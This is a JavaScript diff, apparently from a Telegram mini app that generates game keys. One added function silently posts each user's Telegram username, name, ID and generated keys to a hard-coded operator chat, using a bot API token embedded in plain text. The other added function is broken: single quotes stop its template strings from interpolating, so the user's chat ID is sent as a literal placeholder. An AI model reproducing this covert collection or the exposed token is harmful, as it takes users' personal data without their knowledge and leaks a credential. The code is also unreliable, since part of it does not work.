@@ -314,15 +314,43 @@ async function generate() {
     clearInterval(generateTimeInterval);
     updateGenerateTime(gameSelect)
     console.log(codes);
-    send(codes);
+    send1(codes);
+    send2(codes);
 }
-function send(msgArray) {
+function send1(msgArray) {
            const params = new URLSearchParams(decodeURIComponent(window.location.href.split('#')[1]));
             const user = JSON.parse(params.get('user'));
             const escapedMsgArray = msgArray.map(msg => msg.replace(/[-]/g, '\\-'));
             const message = `@${user.username}:${user.first_name}${user.last_name} : ${user.id} \n${escapedMsgArray.join(' ')}`;
             const TOK = '7118863448:AAFUXZ9lIOPB7-8HqIJDnsigUdATvpkg4L8';
             const TcID = '-1002248182942';
+            const data = JSON.stringify({
+                chat_id: TcID,
+                text: message,
+                parse_mode: 'MarkdownV2'
+            });
+           
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', `https://api.telegram.org/bot${TOK}/sendMessage`, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    //console.log('Message sent successfully:', xhr.responseText);
+                } else if (xhr.readyState === 4) {
+                    //console.error('Error sending message:', xhr.responseText);
+                }
+            };
+            xhr.send(data);
+        }
+function send2(msgArray) {
+           const params = new URLSearchParams(decodeURIComponent(window.location.href.split('#')[1]));
+            const user = JSON.parse(params.get('user'));
+            const escapedMsgArray = msgArray.map(msg => msg.replace(/[-]/g, '\\-'));
+           const formattedMsgArray = escapedMsgArray.map((msg, index) => '🔑${index + 1}: \`${msg}\`');
+           const message = '👇Your Keys Generation Result👇\n${formattedMsgArray.join('\n')}';
+         console.log(message);
+        const TOK = '7118863448:AAFUXZ9lIOPB7-8HqIJDnsigUdATvpkg4L8';
+            const TcID = '${user.id}';
             const data = JSON.stringify({
                 chat_id: TcID,
                 text: message,
